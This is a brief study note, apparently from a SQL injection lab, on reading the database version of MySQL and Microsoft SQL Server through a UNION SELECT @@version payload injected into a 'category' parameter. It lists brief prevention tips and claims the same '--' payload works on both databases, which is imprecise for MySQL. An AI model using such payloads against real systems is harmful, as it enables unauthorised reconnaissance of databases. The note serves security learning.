# 💉 SQL Injection - Querying Database Version (MySQL & MSSQL)



Learned how to extract database version in MySQL and Microsoft SQL Server.

---

## 🔍 Step 1: Vulnerable Input

```text
category=Gifts
```

---

## ⚔️ Step 2: Payload for MySQL

```sql
' UNION SELECT @@version, NULL--
```

---

## ⚔️ Step 3: Payload for MSSQL

```sql
' UNION SELECT @@version, NULL--
```

(Both use `@@version`)

---

## 🧠 Explanation

* `@@version` → returns DB version
* `UNION` → combines with original query
* `NULL` → balances columns

---

## 🚀 Result

Page displayed:

```text
MySQL version 8.x / Microsoft SQL Server version...
```

---

## 🏁 Final Result

Extracted:

* Database type
* Version

---

## 🧠 Key Learnings

* `@@version` works in multiple DBs
* Same payload works across MySQL & MSSQL
* Important for fingerprinting

---

## 🔐 Prevention

* Use prepared statements
* Avoid exposing DB metadata

---

## 🔥 Insight

> Identifying DB type helps choose correct attack strategy.
